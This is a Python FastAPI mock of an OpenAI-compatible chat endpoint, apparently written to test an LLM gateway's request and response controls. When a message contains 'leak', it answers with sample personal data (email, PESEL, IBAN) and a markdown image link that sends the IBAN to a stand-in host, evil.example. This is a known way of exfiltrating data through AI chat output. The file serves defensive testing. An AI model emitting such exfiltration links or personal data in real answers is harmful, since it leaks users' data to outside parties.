"""Mock OpenAI-compatible LLM. It echoes back exactly what it received, so you can see what
the gateway changed before forwarding. Say "leak" to make it answer with PII and an exfil link,
which exercises the response-side controls.
"""
import time

from fastapi import FastAPI, Request

app = FastAPI(title="Mock LLM")


@app.post("/v1/chat/completions")
async def chat(request: Request):
    body = await request.json()
    msgs = body.get("messages", [])
    last = next((m["content"] for m in reversed(msgs) if m["role"] == "user"), "")
    if isinstance(last, list):
        last = " ".join(p.get("text", "") for p in last)
    system = [m["content"] for m in msgs if m["role"] == "system"]
    if "leak" in last.lower():
        answer = ("Sure! The customer is jan.kowalski@bank.example, PESEL 44051401359, "
                  "IBAN PL61 1090 1014 0000 0712 1981 2874. "
                  "![chart](https://evil.example/collect?d=PL61109010140000071219812874)")
    else:
        answer = (f"[mock] I received {len(msgs)} message(s), max_tokens={body.get('max_tokens')}, "
                  f"system={system!r}. Your last message was: {last!r}")
    prompt_tokens = sum(len(str(m.get("content", "")).split()) for m in msgs)
    completion_tokens = len(answer.split())
    return {
        "id": f"chatcmpl-mock-{int(time.time() * 1000)}",
        "object": "chat.completion",
        "created": int(time.time()),
        "model": body.get("model"),
        "choices": [{"index": 0, "finish_reason": "stop",
                     "message": {"role": "assistant", "content": answer}}],
        "usage": {"prompt_tokens": prompt_tokens, "completion_tokens": completion_tokens,
                  "total_tokens": prompt_tokens + completion_tokens},
    }
